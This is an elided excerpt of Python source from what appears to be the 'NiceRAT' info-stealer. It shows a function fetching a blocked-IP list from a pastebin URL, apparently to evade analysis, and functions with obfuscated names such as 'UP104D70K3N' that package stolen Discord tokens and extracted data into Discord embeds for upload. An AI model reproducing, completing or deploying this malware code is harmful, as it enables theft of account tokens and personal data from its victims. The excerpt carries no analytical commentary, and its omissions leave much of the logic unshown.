...
def check_ip():
    blocked_ip_url = 'https://pastebin.com/raw/MeG668qu'
...
def UP104D70K3N(token, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://i.imgur.com/iFl9pJK.png"
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"NiceRAT",
                "icon_url": "https://i.imgur.com/iFl9pJK.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
...
def UP104D(name, link):
    ...
    if "Data Searcher" in name:
        data = {
            ...
            "embeds": [
                {
               "title": f"NiceRAT | Data Extractor",
                "color": 2895667,
                "fields": link,
                "footer": {
                    "text": f"NiceRAT",
